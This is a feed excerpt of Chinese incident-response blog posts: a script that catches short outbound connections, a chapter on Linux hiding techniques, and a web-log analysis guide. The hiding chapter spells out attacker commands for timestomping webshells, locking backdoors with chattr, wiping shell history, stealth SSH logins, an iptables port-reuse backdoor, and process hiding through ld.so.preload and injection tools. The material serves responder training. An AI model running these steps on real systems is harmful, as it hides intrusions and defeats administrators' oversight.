    <content type="html"><![CDATA[<h2 id="第2篇：捕捉短连接"><a href="#第2篇：捕捉短连接" class="headerlink" title="第2篇：捕捉短连接"></a>第2篇：捕捉短连接</h2><h3 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h3><p>​    短连接（short connnection）是相对于长连接而言的概念，指的是在数据传送过程中，只在需要发送数据时，才去建立一个连接，数据发送完成后，则断开此连接，即每次连接只完成一项业务的发送。 在系统维护中，一般很难去察觉，需要借助网络安全设备或者抓包分析，才能够去发现。</p><h3 id="0x01-应急场景"><a href="#0x01-应急场景" class="headerlink" title="0x01 应急场景"></a>0x01 应急场景</h3><p>​    某天，网络管理员在出口WAF检测到某台服务器不断向香港I发起请求 ，感觉很奇怪，登录服务器排查，想要找到发起短连接的进程。</p><h3 id="0x02-日志分析"><a href="#0x02-日志分析" class="headerlink" title="0x02 日志分析"></a>0x02 日志分析</h3><p>​    登录服务器查看端口、进程，并未发现发现服务器异常，但是当多次刷新端口连接时，可以查看该连接。 有时候一直刷这条命令好十几次才会出现，像这种的短连接极难捕捉到对应的进程和源文件。 </p><p><img src="./image/linux-11-1.png" alt=""></p><p>手动捕捉估计没戏，很难追踪，于是动手写了一段小脚本来捕捉短连接对应的pid和源文件。</p><p>脚本文件如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">ip=118.184.15.40</span><br><span class="line">i=1</span><br><span class="line"><span class="keyword">while</span> :</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">   tmp=netstat -anplt|grep <span class="variable">$ip</span>|awk -F <span class="string">&#x27;[/]&#x27;</span> <span class="string">&#x27;&#123;print $1&#125;&#x27;</span>|awk <span class="string">&#x27;&#123;print $7&#125;&#x27;</span></span><br><span class="line">   <span class="comment">#echo $tmp</span></span><br><span class="line">   <span class="keyword">if</span> <span class="built_in">test</span> -z <span class="string">&quot;<span class="variable">$tmp</span>&quot;</span></span><br><span class="line">   <span class="keyword">then</span></span><br><span class="line">       ((i=i+<span class="number">1</span>)) </span><br><span class="line">   <span class="keyword">else</span></span><br><span class="line">       <span class="keyword">for</span> pid <span class="keyword">in</span> <span class="variable">$tmp</span>; <span class="keyword">do</span></span><br><span class="line">           <span class="built_in">echo</span> <span class="string">&quot;PID: &quot;</span><span class="variable">$&#123;pid&#125;</span></span><br><span class="line">          result=<span class="built_in">ls</span> -lh /proc/<span class="variable">$pid</span>|grep exe</span><br><span class="line">          <span class="built_in">echo</span> <span class="string">&quot;Process: &quot;</span><span class="variable">$&#123;result&#125;</span></span><br><span class="line">          <span class="built_in">kill</span> -9 <span class="variable">$pid</span></span><br><span class="line">       <span class="keyword">done</span></span><br><span class="line">       <span class="built_in">break</span></span><br><span class="line">   <span class="keyword">fi</span> </span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Total number of times: &quot;</span><span class="variable">$&#123;i&#125;</span></span><br></pre></td></tr></table></figure><p>运行结果如下： </p><p><img src="./image/linux-11-2.png" alt=""></p><p>跑了三次脚本，可以发现短连接每次发起的进程Pid一直在变，但已经捕捉到发起该异常连接的进程源文件为 /usr/lib/nfsiod</p><h3 id="0x04-小结"><a href="#0x04-小结" class="headerlink" title="0x04 小结"></a>0x04 小结</h3><p>​    本文简单介绍了短连接以及捕捉短连接源文件的技巧，站在安全管理员的角度，应加强对网络安全设备的管理，在网络层去发现更多在系统层很难察觉的安全威胁。</p>]]></content>
    
    
    <summary type="html">学习应急响应咯!</summary>
    
    
    
    <category term="渗透测试" scheme="https://github.com/Eviden0/new-webpage/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="应急响应" scheme="https://github.com/Eviden0/new-webpage/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"/>
    
  </entry>
  
  <entry>
    <title>第05章：Linux权限维持 隐藏篇</title>
    <link href="https://github.com/Eviden0/new-webpage/posts/bca12e93.html"/>
    <id>https://github.com/Eviden0/new-webpage/posts/bca12e93.html</id>
    <published>2024-06-13T05:10:00.000Z</published>
    <updated>2024-06-13T06:21:22.614Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h3><p>攻击者在获取服务器权限后，会通过一些技巧来隐藏自己的踪迹和后门文件，本文介绍Linux下的几种隐藏技术。</p><h3 id="0x01-隐藏文件"><a href="#0x01-隐藏文件" class="headerlink" title="0x01 隐藏文件"></a>0x01 隐藏文件</h3><p>Linux 下创建一个隐藏文件：<code>touch  .test.txt</code>  </p><p>touch 命令可以创建一个文件，文件名前面加一个 点 就代表是隐藏文件,如下图：</p><p><img src="https://gitee.com/eviden/img/raw/master/202406131418510.png" alt=""></p><p>一般的Linux下的隐藏目录使用命令<code>ls -l</code>是查看不出来的，只能查看到文件及文件夹，查看Linux下的隐藏文件需要用到命令：<code>ls -al</code></p><p>这里，我们可以看到在/tmp下，默认存在多个隐藏目录，这些目录是恶意文件常用来藏身的地方。如<code>/temp/.ICE-unix/、/temp/.Test-unix/、/temp/.X11-unix/、/temp/.XIM-unix/</code></p><h3 id="0x02-隐藏文件时间戳"><a href="#0x02-隐藏文件时间戳" class="headerlink" title="0x02 隐藏文件时间戳"></a>0x02 隐藏文件时间戳</h3><p>Unix 下藏后门必须要修改时间，否则很容易被发现，直接利用 touch 就可以了。</p><p>比如参考 index.php 的时间，再赋给 webshell.php，结果两个文件的时间就一样了。</p><p>利用方法</p><p>touch -r index.php webshell.php</p><p>或者直接将时间戳修改成某年某月某日。如下 2014 年 01 月 02 日。</p><p>touch -t 1401021042.30 webshell.php</p><h3 id="0x03-隐藏权限"><a href="#0x03-隐藏权限" class="headerlink" title="0x03 隐藏权限"></a>0x03 隐藏权限</h3><p>在Linux中，使用chattr命令来防止root和其他管理用户误删除和修改重要文件及目录，此权限用ls -l是查看不出来的，从而达到隐藏权限的目的。</p><p>这个技巧常被用在后门，变成了一些难以清除的后门文件，令很多新手朋友感到头疼。</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">chattr +<span class="selector-tag">i</span> evil<span class="selector-class">.php</span> 锁定文件</span><br><span class="line">lsattr  evil<span class="selector-class">.php</span>   属性查看</span><br><span class="line">chattr -<span class="selector-tag">i</span> evil<span class="selector-class">.php</span> 解除锁定</span><br><span class="line">rm -rf <span class="number">1</span><span class="selector-class">.evil</span><span class="selector-class">.php</span>  删除文件</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/eviden/img/raw/master/202406131418337.png" alt=""></p><h3 id="0x04-隐藏历史操作命令"><a href="#0x04-隐藏历史操作命令" class="headerlink" title="0x04 隐藏历史操作命令"></a>0x04 隐藏历史操作命令</h3><p>在shell中执行的命令，不希望被记录在命令行历史中，如何在linux中开启无痕操作模式呢？</p><p>技巧一：只针对你的工作关闭历史记录</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[<span class="literal">space</span>]<span class="keyword">set</span> +o history</span><br><span class="line">备注：[<span class="literal">space</span>] 表示空格。并且由于空格的缘故，该命令本身也不会被记录。</span><br></pre></td></tr></table></figure><p>上面的命令会临时禁用历史功能，这意味着在这命令之后你执行的所有操作都不会记录到历史中，然而这个命令之前的所有东西都会原样记录在历史列表中。</p><p>要重新开启历史功能，执行下面的命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[Space]<span class="built_in">set</span> -o <span class="built_in">history</span></span><br><span class="line">它将环境恢复原状，也就是你完成了你的工作，执行上述命令之后的命令都会出现在历史中。</span><br></pre></td></tr></table></figure><p>技巧二：从历史记录中删除指定的命令</p><p>假设历史记录中已经包含了一些你不希望记录的命令。这种情况下我们怎么办？很简单。通过下面的命令来删除：</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">history</span> | <span class="keyword">grep</span> <span class="string">&quot;keyword&quot;</span></span><br></pre></td></tr></table></figure><p>输出历史记录中匹配的命令，每一条前面会有个数字。从历史记录中删除那个指定的项：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">history</span> -d<span class="meta"> [num]</span></span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/eviden/img/raw/master/202406131418497.png" alt=""></p><p>这种技巧是关键记录删除，或者我们可以暴力点，比如前150行是用户的正常操作记录，150以后是攻击者操作记录。我们可以只保留正常的操作，删除攻击痕迹的历史操作记录，这里，我们只保留前150行：</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">sed</span> -i <span class="string">&#x27;150,<span class="variable">$d</span>&#x27;</span> .bash_history</span><br></pre></td></tr></table></figure><h3 id="0x05-隐藏远程SSH登陆记录"><a href="#0x05-隐藏远程SSH登陆记录" class="headerlink" title="0x05 隐藏远程SSH登陆记录"></a>0x05 隐藏远程SSH登陆记录</h3><h1 id="隐身登录系统，不会被w、who、last等指令检测到。"><a href="#隐身登录系统，不会被w、who、last等指令检测到。" class="headerlink" title="隐身登录系统，不会被w、who、last等指令检测到。"></a>隐身登录系统，不会被w、who、last等指令检测到。</h1><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">ssh</span> -T root@<span class="number">127.0.0.1</span> /bin/bash -i</span><br></pre></td></tr></table></figure><p>不记录ssh公钥在本地.ssh目录中</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -o UserKnownHostsFile=<span class="regexp">/dev/</span><span class="keyword">null</span> -T user@host <span class="regexp">/bin/</span>bash –i</span><br></pre></td></tr></table></figure><h3 id="0x06-端口复用"><a href="#0x06-端口复用" class="headerlink" title="0x06 端口复用"></a>0x06 端口复用</h3><p>通过端口复用来达到隐藏端口的目的，在Linux下，如何实现端口复用呢？</p><p>第一种方式：通过SSLH在同一端口上共享SSH与HTTPS</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#安装SSLH</span></span><br><span class="line">sudo apt-<span class="built_in">get</span> install sslh</span><br><span class="line"><span class="comment">#配置SSLH</span></span><br><span class="line">编辑 SSLH 配置文件：</span><br><span class="line">sudo vi /etc/default/sslh</span><br><span class="line">1、找到下列行：<span class="attribute">Run</span>=<span class="literal">no</span>  将其修改为：<span class="attribute">Run</span>=<span class="literal">yes</span></span><br><span class="line">2、修改以下行以允许 SSLH 在所有可用接口上侦听端口 443</span><br><span class="line"><span class="attribute">DAEMON_OPTS</span>=<span class="string">&quot;--user sslh --listen 0.0.0.0:443 --ssh 127.0.0.1:22 --ssl 127.0.0.1:443 --pidfile /var/run/sslh/sslh.pid&quot;</span></span><br></pre></td></tr></table></figure><p>第二种方式：利用IPTables进行端口复用</p><figure class="highlight dsconfig"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 端口复用链</span></span><br><span class="line"><span class="string">iptables</span> -<span class="string">t</span> <span class="string">nat</span> -<span class="string">N</span> <span class="string">LETMEIN</span></span><br><span class="line"><span class="comment"># 端口复用规则</span></span><br><span class="line"><span class="string">iptables</span> -<span class="string">t</span> <span class="string">nat</span>  -<span class="string">A</span> <span class="string">LETMEIN</span> -<span class="string">p</span> <span class="string">tcp</span> -<span class="string">j</span> <span class="string">REDIRECT</span> <span class="built_in">--to-port</span> <span class="string">22</span></span><br><span class="line"><span class="comment"># 开启开关</span></span><br><span class="line"><span class="string">iptables</span> -<span class="string">A</span> <span class="string">INPUT</span> -<span class="string">p</span> <span class="string">tcp</span> -<span class="string">m</span> <span class="string">string</span> <span class="built_in">--string</span> <span class="string">&#x27;threathuntercoming&#x27;</span> <span class="built_in">--algo</span> <span class="string">bm</span> -<span class="string">m</span> <span class="string">recent</span> <span class="built_in">--set</span> <span class="built_in">--name</span> <span class="string">letmein</span> <span class="built_in">--rsource</span> -<span class="string">j</span> <span class="string">ACCEPT</span></span><br><span class="line"><span class="comment"># 关闭开关</span></span><br><span class="line"><span class="string">iptables</span> -<span class="string">A</span> <span class="string">INPUT</span> -<span class="string">p</span> <span class="string">tcp</span> -<span class="string">m</span> <span class="string">string</span> <span class="built_in">--string</span> <span class="string">&#x27;threathunterleaving&#x27;</span> <span class="built_in">--algo</span> <span class="string">bm</span> -<span class="string">m</span> <span class="string">recent</span> <span class="built_in">--name</span> <span class="string">letmein</span> <span class="built_in">--remove</span> -<span class="string">j</span> <span class="string">ACCEPT</span></span><br><span class="line"><span class="comment"># let&#x27;s do it</span></span><br><span class="line"><span class="string">iptables</span> -<span class="string">t</span> <span class="string">nat</span> -<span class="string">A</span> <span class="string">PREROUTING</span> -<span class="string">p</span> <span class="string">tcp</span> <span class="built_in">--dport</span> <span class="string">80</span> <span class="built_in">--syn</span> -<span class="string">m</span> <span class="string">recent</span> <span class="built_in">--rcheck</span> <span class="built_in">--seconds</span> <span class="string">3600</span> <span class="built_in">--name</span> <span class="string">letmein</span> <span class="built_in">--rsource</span> -<span class="string">j</span> <span class="string">LETMEIN</span></span><br></pre></td></tr></table></figure><p>利用方式：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#开启复用</span></span><br><span class="line"><span class="attribute">echo</span> threathuntercoming | socat - tcp:<span class="number">192.168.28.128:80</span></span><br><span class="line"><span class="comment">#ssh使用80端口进行登录</span></span><br><span class="line"><span class="attribute">ssh</span> -p <span class="number">80</span> root@<span class="number">192.168.28.128</span></span><br><span class="line"><span class="comment">#关闭复用</span></span><br><span class="line"><span class="attribute">echo</span> threathunterleaving | socat - tcp:<span class="number">192.168.28.128:80</span></span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/eviden/img/raw/master/202406131418523.png" alt=""></p><p> 具体文章详见：<a href="https://www.freebuf.com/articles/network/137683.html">远程遥控 IPTables 进行端口复用</a></p><h3 id="0x07-进程隐藏"><a href="#0x07-进程隐藏" class="headerlink" title="0x07 进程隐藏"></a>0x07 进程隐藏</h3><p>管理员无法通过相关命令工具查找到你运行的进程，从而达到隐藏目的，实现进程隐藏。</p><p>第一种方法：libprocesshider</p><p>github项目地址：<a href="https://github.com/gianlucaborello/libprocesshider">https://github.com/gianlucaborello/libprocesshider</a></p><p>利用 LD_PRELOAD 来实现系统函数的劫持，实现如下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 下载程序编译</span></span><br><span class="line">git <span class="built_in">clone</span> https://github.com/gianlucaborello/libprocesshider.git</span><br><span class="line"><span class="built_in">cd</span> libprocesshider/ &amp;&amp; make</span><br><span class="line"><span class="comment"># 移动文件到/usr/local/lib/目录下</span></span><br><span class="line"><span class="built_in">cp</span> libprocesshider.so /usr/local/lib/</span><br><span class="line"><span class="comment"># 把它加载到全局动态连接局</span></span><br><span class="line"><span class="built_in">echo</span> /usr/local/lib/libprocesshider.so &gt;&gt; /etc/ld.so.preload</span><br></pre></td></tr></table></figure><p>测试：运行 evil_script.py，</p><p><img src="https://gitee.com/eviden/img/raw/master/202406131418927.png" alt=""></p><p>此时发现在top 与 ps 中都无法找到 evil_script.py， cpu 使用率高,但是却找不到任何占用cpu高的程序。</p><p><img src="https://gitee.com/eviden/img/raw/master/202406131418195.png" alt=""></p><p>如何在Linux中发现隐藏的进程，</p><p><code>unhide</code> 是一个小巧的网络取证工具，能够发现那些借助rootkit，LKM及其它技术隐藏的进程和TCP / UDP端口。这个工具在Linux，UNIX类，MS-Windows等操作系统下都可以工作。</p><p>下载地址：<a href="http://www.unhide-forensics.info/">http://www.unhide-forensics.info/</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 安装</span></span><br><span class="line"><span class="built_in">sudo</span> yum install unhide</span><br><span class="line"><span class="comment"># 使用</span></span><br><span class="line">unhide [options] test_list</span><br></pre></td></tr></table></figure><p>使用<code>unhide proc</code>发现隐藏进程evil_script.py，如下图所示：</p><p><img src="https://gitee.com/eviden/img/raw/master/202406131418073.png" alt=""></p><p>第二种方法：进程注入工具linux-inject</p><p>linux-inject是用于将共享对象注入Linux进程的工具</p><p>github项目地址： <a href="https://github.com/gaffe23/linux-inject.git">https://github.com/gaffe23/linux-inject.git</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 下载程序编译</span></span><br><span class="line">git <span class="built_in">clone</span> https://github.com/gaffe23/linux-inject.git</span><br><span class="line"><span class="built_in">cd</span> linux-inject &amp;&amp; make</span><br><span class="line"><span class="comment"># 测试进程</span></span><br><span class="line">./sample-target</span><br><span class="line"><span class="comment"># 进程注入</span></span><br><span class="line">./inject -n sample-target sample-library.so</span><br></pre></td></tr></table></figure><p>验证进程注入成功，如下图所示：</p><p><img src="https://gitee.com/eviden/img/raw/master/202406131418231.png" alt=""></p><p>Cymothoa是一款隐秘的后门工具。它通过向目标主机活跃的进程注入恶意代码，从而获取和原进程相同的权限。该工具最大的优点就是不创建新的进程，不容易被发现。</p><p>下载地址：<a href="https://sourceforge.net/projects/cymothoa/files/cymothoa-1-beta/">https://sourceforge.net/projects/cymothoa/files/cymothoa-1-beta/</a></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 下载解压</span></span><br><span class="line"><span class="attribute">wget</span> https://jaist.dl.sourceforge.net/project/cymothoa/cymothoa-<span class="number">1</span>-beta/cymothoa-<span class="number">1</span>-beta.tar.gz</span><br><span class="line"><span class="attribute">tar</span> zxvf cymothoa-<span class="number">1</span>-beta.tar.gz </span><br><span class="line"><span class="comment"># </span></span><br><span class="line"><span class="attribute">cd</span> cymothoa-<span class="number">1</span>-beta &amp;&amp; make</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="0x07-结语"><a href="#0x07-结语" class="headerlink" title="0x07 结语"></a>0x07 结语</h3><p>本文主要介绍了Linux下的几种隐藏技术，包括隐藏文件、隐藏权限、隐藏历史操作命令、端口复用、进程隐藏等方面的技巧。仅作抛砖引玉之用，欢迎留言分享。</p>]]></content>
    
    
    <summary type="html">学习应急响应咯!</summary>
    
    
    
    <category term="渗透测试" scheme="https://github.com/Eviden0/new-webpage/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="应急响应" scheme="https://github.com/Eviden0/new-webpage/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"/>
    
  </entry>
  
  <entry>
    <title>第02章：日志分析篇第3篇：Web日志分析</title>
    <link href="https://github.com/Eviden0/new-webpage/posts/893fe81c.html"/>
    <id>https://github.com/Eviden0/new-webpage/posts/893fe81c.html</id>
    <published>2024-06-13T05:10:00.000Z</published>
    <updated>2024-06-13T05:57:09.062Z</updated>
    
    <content type="html"><![CDATA[<h2 id="第3篇-Web日志分析"><a href="#第3篇-Web日志分析" class="headerlink" title="第3篇:Web日志分析"></a>第3篇:Web日志分析</h2><h3 id="ox01-Web日志"><a href="#ox01-Web日志" class="headerlink" title="ox01  Web日志"></a>ox01  Web日志</h3><p>Web访问日志记录了Web服务器接收处理请求及运行时错误等各种原始信息。通过对WEB日志进行的安全分析，不仅可以帮助我们定位攻击者，还可以帮助我们还原攻击路径，找到网站存在的安全漏洞并进行修复。</p><p>我们来看一条Apache的访问日志：</p><p><code>127.0.0.1 - - [11/Jun/2018:12:47:22 +0800] &quot;GET /login.html HTTP/1.1&quot; 200 786 &quot;-&quot; &quot;Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36&quot;</code></p><p>通过这条Web访问日志，我们可以清楚的得知用户在什么IP、什么时间、用什么操作系统、什么浏览器的情况下访问了你网站的哪个页面，是否访问成功。</p><p>本文通过介绍Web日志安全分析时的思路和常用的一些技巧。</p><h3 id="0x02-日志分析技巧"><a href="#0x02-日志分析技巧" class="headerlink" title="0x02 日志分析技巧"></a>0x02 日志分析技巧</h3><p>在对WEB日志进行安全分析时，一般可以按照两种思路展开，逐步深入，还原整个攻击过程。</p><p>第一种：确定入侵的时间范围，以此为线索，查找这个时间范围内可疑的日志，进一步排查，最终确定攻击者，还原攻击过程。</p><p>第二种：攻击者在入侵网站后，通常会留下后门维持权限，以方便再次访问，我们可以找到该文件，并以此为线索来展开分析。</p><p>常用分析工具：</p><p>Window下，推荐用 EmEditor 进行日志分析，支持大文本，搜索效率还不错。</p><p>Linux下，使用Shell命令组合查询分析。</p><p>Shell+Linux命令实现日志分析，一般结合grep、awk等命令等实现了几个常用的日志分析统计技巧。</p><p>Apache日志分析技巧：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">1、列出当天访问次数最多的IP命令：</span><br><span class="line"><span class="built_in">cut</span> -d- -f 1 log_file|<span class="built_in">uniq</span> -c | <span class="built_in">sort</span> -rn | <span class="built_in">head</span> -20</span><br><span class="line"></span><br><span class="line">2、查看当天有多少个IP访问：</span><br><span class="line">awk <span class="string">&#x27;&#123;print $1&#125;&#x27;</span> log_file|<span class="built_in">sort</span>|<span class="built_in">uniq</span>|<span class="built_in">wc</span> -l</span><br><span class="line"></span><br><span class="line">3、查看某一个页面被访问的次数：</span><br><span class="line">grep <span class="string">&quot;/index.php&quot;</span> log_file | <span class="built_in">wc</span> -l</span><br><span class="line"></span><br><span class="line">4、查看每一个IP访问了多少个页面：</span><br><span class="line">awk <span class="string">&#x27;&#123;++S[$1]&#125; END &#123;for (a in S) print a,S[a]&#125;&#x27;</span> log_file</span><br><span class="line"></span><br><span class="line">5、将每个IP访问的页面数进行从小到大排序：</span><br><span class="line">awk <span class="string">&#x27;&#123;++S[$1]&#125; END &#123;for (a in S) print S[a],a&#125;&#x27;</span> log_file | <span class="built_in">sort</span> -n</span><br><span class="line"></span><br><span class="line">6、查看某一个IP访问了哪些页面：</span><br><span class="line">grep ^111.111.111.111 log_file| awk <span class="string">&#x27;&#123;print $1,$7&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line">7、去掉搜索引擎统计当天的页面：</span><br><span class="line">awk <span class="string">&#x27;&#123;print $12,$1&#125;&#x27;</span> log_file | grep ^\&quot;Mozilla | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> |<span class="built_in">sort</span> | <span class="built_in">uniq</span> | <span class="built_in">wc</span> -l</span><br><span class="line"></span><br><span class="line">8、查看2018年6月21日14时这一个小时内有多少IP访问:</span><br><span class="line">awk <span class="string">&#x27;&#123;print $4,$1&#125;&#x27;</span> log_file | grep 21/Jun/2018:14 | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span>| <span class="built_in">sort</span> | <span class="built_in">uniq</span> | <span class="built_in">wc</span> -l</span><br></pre></td></tr></table></figure><h3 id="0x03-日志分析案例"><a href="#0x03-日志分析案例" class="headerlink" title="0x03 日志分析案例"></a>0x03 日志分析案例</h3><p>Web日志分析实例：通过nginx代理转发到内网某服务器，内网服务器某站点目录下被上传了多个图片木马，虽然II7下不能解析，但还是想找出谁通过什么路径上传的。</p><p>在这里，我们遇到了一个问题：由于设置了代理转发，只记录了代理服务器的ip，并没有记录访问者IP？这时候，如何去识别不同的访问者和攻击源呢？</p><p>这是管理员日志配置不当的问题，但好在我们可以通过浏览器指纹来定位不同的访问来源，还原攻击路径。</p><p>1、定位攻击源</p><p>首先访问图片木马的记录，只找到了一条，由于所有访问日志只记录了代理IP，并不能通过IP来还原攻击路径，这时候，可以利用浏览器指纹来定位。</p><p><img src="https://gitee.com/eviden/img/raw/master/log-3-1.png" alt=""></p><p>浏览器指纹：</p><p><code>Mozilla/4.0+(compatible;+MSIE+7.0;+Windows+NT+6.1;+WOW64;+Trident/7.0;+SLCC2;+.NET+CLR+2.0.50727;+.NET+CLR+3.5.30729;+.NET+CLR+3.0.30729;+.NET4.0C;+.NET4.0E)</code></p><p>2、搜索相关日志记录</p><p>通过筛选与该浏览器指纹有关的日志记录，可以清晰地看到攻击者的攻击路径。</p><p><img src="https://gitee.com/eviden/img/raw/master/log-3-2.png" alt=""></p><p>3、对找到的访问日志进行解读，攻击者大致的访问路径如下：</p><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">A</span>、攻击者访问首页和登录页</span><br><span class="line"><span class="variable">B</span>、攻击者访问<span class="variable">MsgSjlb</span><span class="operator">.</span><span class="variable">aspx</span>和<span class="variable">MsgSebd</span><span class="operator">.</span><span class="variable">aspx</span></span><br><span class="line"><span class="built_in">C</span>、攻击者访问<span class="variable">Xzuser</span><span class="operator">.</span><span class="variable">aspx</span></span><br><span class="line"><span class="built_in">D</span>、攻击者多次<span class="variable">POST</span>（怀疑通过这个页面上传模块缺陷）</span><br><span class="line"><span class="built_in">E</span>、攻击者访问了图片木马</span><br></pre></td></tr></table></figure><p>打开网站，访问Xzuser.aspx，确认攻击者通过该页面的进行文件上传了图片木马，同时，发现网站了存在越权访问漏洞，攻击者访问特定URL，无需登录即可进入后台界面。通过日志分析找到网站的漏洞位置并进行修复。</p><h3 id="0x04-日志统计分析技巧"><a href="#0x04-日志统计分析技巧" class="headerlink" title="0x04 日志统计分析技巧"></a>0x04 日志统计分析技巧</h3><p>统计爬虫：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep -E <span class="string">&#x27;Googlebot|Baiduspider&#x27;</span>  /www/logs/access<span class="number">.2019</span>-<span class="number">02</span>-<span class="number">23.</span>log | awk <span class="string">&#x27;&#123; print $1 &#125;&#x27;</span> | sort | uniq</span><br></pre></td></tr></table></figure><p>统计浏览器：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /www/logs/access<span class="number">.2019</span>-<span class="number">02</span>-<span class="number">23.</span>log | grep -v -E <span class="string">&#x27;MSIE|Firefox|Chrome|Opera|Safari|Gecko|Maxthon&#x27;</span> | sort | uniq -c | sort -r -n | head -n <span class="number">100</span></span><br></pre></td></tr></table></figure><p>IP 统计：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">grep <span class="string">&#x27;23/May/2019&#x27;</span> /www/logs/access<span class="number">.2019</span>-<span class="number">02</span>-<span class="number">23.</span>log | awk <span class="string">&#x27;&#123;print $1&#125;&#x27;</span> | awk -F<span class="string">&#x27;.&#x27;</span> <span class="string">&#x27;&#123;print $1&quot;.&quot;$2&quot;.&quot;$3&quot;.&quot;$4&#125;&#x27;</span> | sort | uniq -c | sort -r -n | head -n <span class="number">10</span></span><br><span class="line">   <span class="number">2206</span> <span 